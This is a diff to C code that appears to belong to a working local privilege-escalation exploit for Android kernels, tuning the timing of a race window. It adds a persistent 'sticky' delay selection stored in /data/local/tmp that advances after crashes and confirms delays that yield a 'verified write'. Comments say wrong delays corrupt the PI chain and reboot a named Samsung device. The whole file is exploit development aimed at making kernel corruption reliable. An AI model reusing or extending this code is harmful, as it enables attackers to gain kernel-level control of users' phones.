@@ -549,36 +549,58 @@ static int sync_delay_override(void) {
   return (int)value;
 }
 
-static int sync_next_persistent_delay_index(int count) {
-  static const char state_path[] =
-      "/data/local/tmp/.ghostlock_fops_delay_index";
-  int state_fd = open(state_path, O_RDWR | O_CREAT | O_CLOEXEC, 0600);
-  if (state_fd < 0) {
-    return -1;
-  }
+#define SYNC_DELAY_STATE_MAGIC 0x5a
+#define SYNC_DELAY_STATE_IN_PROGRESS 0x80
+static const char sync_delay_state_path[] =
+    "/data/local/tmp/.ghostlock_fops_delay_index";
 
-  uint8_t stored = 0;
-  ssize_t read_len = pread(state_fd, &stored, sizeof(stored), 0);
-  int index = (read_len == (ssize_t)sizeof(stored) && stored < count)
-                  ? (int)stored
-                  : 0;
-  uint8_t next = (uint8_t)((index + 1) % count);
-  ssize_t write_len = pwrite(state_fd, &next, sizeof(next), 0);
-  int write_errno = errno;
-  errno = 0;
-  int sync_ret = fsync(state_fd);
-  int sync_errno = errno;
+/* The punch delay is device- and state-dependent, so the route keeps a small
+ * candidate table.  Blindly rotating that table is dangerous on targets where
+ * a wrong delay corrupts the PI chain instead of merely missing the window
+ * (SM-F956U1 reboots at 40000/70000us but reaches a verified write at 50000us).
+ * The selection is therefore sticky: the last delay that produced a verified
+ * write is reused, and the search only advances after an attempt that did not
+ * confirm.  An attempt marks itself in-progress before firing, so a crash also
+ * advances the search on the next boot instead of retrying the same value. */
+static int sync_select_delay_index(int count) {
+  int index = 0;
+  int state_fd = open(sync_delay_state_path, O_RDWR | O_CREAT | O_CLOEXEC,
+                      0600);
+  if (state_fd < 0) {
+    return index;
+  }
+  uint8_t record[2] = {0, 0};
+  int have_record =
+      pread(state_fd, record, sizeof(record), 0) == (ssize_t)sizeof(record) &&
+      record[0] == SYNC_DELAY_STATE_MAGIC && (record[1] & 0x7f) < count;
+  if (have_record) {
+    int stored = record[1] & 0x7f;
+    index = (record[1] & SYNC_DELAY_STATE_IN_PROGRESS)
+                ? (stored + 1) % count
+                : stored;
+  }
+  uint8_t marker[2] = {SYNC_DELAY_STATE_MAGIC,
+                       (uint8_t)(SYNC_DELAY_STATE_IN_PROGRESS | index)};
+  if (pwrite(state_fd, marker, sizeof(marker), 0) != (ssize_t)sizeof(marker)) {
+    pr_warning("sync delay state mark write failed\n");
+  }
+  fsync(state_fd);
   close(state_fd);
-  if (write_len != (ssize_t)sizeof(next)) {
-    pr_warning("sync delay index state write failed ret=%zd errno=%d\n",
-               write_len, write_errno);
-    return -1;
-  }
-  if (sync_ret != 0) {
-    pr_warning("sync delay index state fsync failed ret=%d errno=%d\n",
-               sync_ret, sync_errno);
-  }
   return index;
+}
+
+static void sync_confirm_delay_index(int index) {
+  int state_fd = open(sync_delay_state_path, O_WRONLY | O_CREAT | O_CLOEXEC,
+                      0600);
+  if (state_fd < 0) {
+    return;
+  }
+  uint8_t record[2] = {SYNC_DELAY_STATE_MAGIC, (uint8_t)(index & 0x7f)};
+  if (pwrite(state_fd, record, sizeof(record), 0) != (ssize_t)sizeof(record)) {
+    pr_warning("sync delay state confirm write failed\n");
+  }
+  fsync(state_fd);
+  close(state_fd);
 }
 
 int run_sync_route(void) {
@@ -600,27 +622,24 @@ int run_sync_route(void) {
   atomic_store(&gk_fire_count, 0);
   atomic_store(&gk_enter_ts, 0);
 
-  /* Allow one delay to be selected externally while retaining the normal
-   * per-route rotation when the variable is absent. */
+  /* Allow one delay to be selected externally; otherwise use the sticky
+   * persistent selection.  The first entry is the pselect anchor and the
+   * delay verified on SM-F956U1. */
   static const int fops_delays[] = {
-    70000, 60000, 80000, 40000, 90000, 50000,
+    PSELECT_ENTER_DELAY_USEC, 60000, 80000, 90000, 40000, 70000,
   };
   int delay_count = (int)(sizeof(fops_delays) / sizeof(fops_delays[0]));
   static int sync_route_counter;
   int delay_override = sync_delay_override();
-  int delay_index = -1;
-  const char *delay_source = "rotation";
+  int delay_index;
+  const char *delay_source;
   int route_delay = delay_override;
   if (delay_override >= 0) {
     delay_index = sync_route_counter++ % delay_count;
     delay_source = "env";
   } else {
-    delay_index = sync_next_persistent_delay_index(delay_count);
-    if (delay_index >= 0) {
-      delay_source = "persistent";
-    } else {
-      delay_index = sync_route_counter++ % delay_count;
-    }
+    delay_index = sync_select_delay_index(delay_count);
+    delay_source = "persistent";
     route_delay = fops_delays[delay_index];
   }
   atomic_store(&main_route_delay_usec, route_delay);
@@ -680,6 +699,9 @@ int run_sync_route(void) {
   pr_info("sync route done ok=%d timeout_path=%d hit=%d step=%d\n",
           ok, atomic_load(&gk_t1_timeout), atomic_load(&gk_window_hit),
           cfi_last_step);
+  if (delay_override < 0 && ok) {
+    sync_confirm_delay_index(delay_index);
+  }
   atomic_store(&gk_release, 1);
   atomic_store(&gk_route_done, 1);
   pthread_join(waiter, NULL);
